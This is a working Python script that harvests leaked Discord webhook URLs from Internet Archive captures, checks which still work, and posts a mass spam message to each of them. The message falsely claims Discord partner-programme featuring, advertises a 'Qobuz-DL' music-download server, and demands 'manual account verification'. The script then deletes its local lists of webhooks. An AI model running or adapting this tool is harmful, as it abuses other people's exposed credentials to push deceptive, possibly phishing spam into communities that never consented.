from rich.progress import track
import json
import shutil
import requests
import re
import datetime
import os

urls = ["https://discord.com/api/webhooks/", "https://discordapp.com/api/webhooks/"]

pathPattern = "https://web.archive.org/web/timemap/json?url={path}&matchType=prefix&collapse=urlkey&output=json&fl=original,mimetype,timestamp,endtimestamp,groupcount,uniqcount&filter=!statuscode:[45]..&limit={limit}&_=1743772262995"

discord_invite: str = "http://discord.gg/q83Yg8mVjc"
valid_webhook_path: str = "valid_webhooks.txt"
valid_send_log_path: str = "valid_send_log.txt"
valid_webhook_json_path: str = "valid_webhooks.json"
invalid_webhook_path: str = "invalid_webhooks.txt"
valid_webhook_pattern = r'https:\/\/(?:discord(?:app)?\.com|discord\.gg)\/api\/webhooks\/\d+\/[A-Za-z0-9-_]+'
fetch_limit: int = 2000

with open(valid_send_log_path, "a") as f:
    f.write("")

with open(valid_webhook_path, "a") as f:
    f.write("")

with open(invalid_webhook_path, "a") as f:
    f.write("")

with open(valid_webhook_json_path, "a") as f:
    f.write("")

def write_valid_webhooks(webhooks: list):
    with open(valid_webhook_path, "a") as f:
        for webhook in webhooks:
            f.write(f"{webhook}\n")

def write_invalid_webhooks(webhooks: list):
    with open(invalid_webhook_path, "a") as f:
        for webhook in webhooks:
            f.write(f"{webhook}\n")

def write_valid_send_log(webhook: str):
    with open(valid_send_log_path, "a") as f:
        f.write(f"{webhook}\n")

def is_valid_webhook(webhook: str) -> bool:
    with open(valid_webhook_path, "r") as f:
        valid_webhooks = f.readlines()

    valid_webhooks = [x.strip() for x in valid_webhooks]

    if webhook in valid_webhooks:
        return True
    else:
        return False
    
def is_invalid_webhook(webhook: str) -> bool:
    with open(invalid_webhook_path, "r") as f:
        invalid_webhooks = f.readlines()

    invalid_webhooks = [x.strip() for x in invalid_webhooks]

    if webhook in invalid_webhooks:
        return True
    else:
        return False
    
def get_valid_webhooks() -> list:
    with open(valid_webhook_path, "r") as f:
        valid_webhooks = f.readlines()

    valid_webhooks = [x.strip() for x in valid_webhooks]

    return valid_webhooks

for url in urls:
    print(f"Fetching data for {url}")
    apiPath = pathPattern.format(path=url, limit=fetch_limit)

    response = requests.get(apiPath)

    if not response.status_code == 200:
        print(f"Error fetching data for {url}: {response.status_code}")
        continue

    data = response.json()[1::]

    webhooks: list = []

    for item in data:
        webhooks.append(item[0])

    if len(webhooks) == 0:
        print(f"No webhooks found for {url}")
        continue

    print(f"Found {len(webhooks)} webhooks for {url}")

    valid_webhooks: list = []
    invalid_webhooks: list = []

    for webhook in track(webhooks, description="Checking webhooks..."):
        if is_valid_webhook(webhook) or is_invalid_webhook(webhook):
            continue

        match = re.match(valid_webhook_pattern, webhook)

        if not match or webhook.endswith('slack'):
            invalid_webhooks.append(webhook)
            continue

        response = requests.get(webhook)

        if response.status_code == 200: 
            valid_webhooks.append(webhook)
        else:
            invalid_webhooks.append(webhook)

    print(f"Valid webhooks: {len(valid_webhooks)}")
    print(f"Invalid webhooks: {len(invalid_webhooks)}")

    write_valid_webhooks(valid_webhooks)
    write_invalid_webhooks(invalid_webhooks)

valid_webhooks = get_valid_webhooks()

print(f"Total valid webhooks: {len(valid_webhooks)}")

for webhook in track(valid_webhooks, description="Fetching data for valid webhooks..."):
    response = requests.get(webhook)

    if response.status_code == 200:
        with open(valid_webhook_json_path, "r") as f:
            try:
                existing_webhooks = json.loads(f.read())
            except json.JSONDecodeError:
                existing_webhooks = []

        existing_webhooks.append(response.json())

        with open(valid_webhook_json_path, "w") as f:
            f.write(json.dumps(existing_webhooks, indent=4) + "\n")
    else:
        print(f"Error fetching data for {webhook}: {response.status_code}")
        continue

print("Finished fetching data for all webhooks")

shutil.copyfile(valid_webhook_json_path, f"valid_webhooks_backup_{datetime.datetime.now().strftime("%d_%m_%Y_%H_%M")}.json")
print("Backup created for valid webhooks JSON file")

content = {
    "content": "Our top server this month, featured on the Discord partner programme. https://discord.com/partners.",
    "embeds": [
        {
        "title": "Qobuz-DL",
        "description": "A frontend borwser client for downloading music for Qobuz.",
        "color": 0,
        "fields": [
            {
            "name": "Discord Invite",
            "value": "http://discord.gg/q83Yg8mVjc"
            }
        ],
        "footer": {
            "text": "Manual account verification - Required*"
        },
        "thumbnail": {
            "url": "https://www.qobuz-dl.com/favicon.ico"
        }
        }
    ],
    "username": "Disco Sponsor 🌿",
    "avatar_url": "https://cdn.prod.website-files.com/6257adef93867e50d84d30e2/625dccf498809146b9bd1058_ae0db1b59b53e7057a10ec0cea023730.svg",
    "attachments": []
}

for webhook in track(valid_webhooks, description="Sending messages to valid webhooks..."):
    response = requests.post(webhook, json=content)
    if response.status_code == 200 or response.status_code == 204:
        write_valid_send_log(webhook)
    else:
        write_invalid_webhooks([webhook])
        continue

os.remove(valid_webhook_path)
os.remove(valid_webhook_json_path)
print("Successfully removed valid webhooks and json file")
print("Finished sending messages to all valid webhooks")
print("All tasks completed successfully")
print("Exiting...")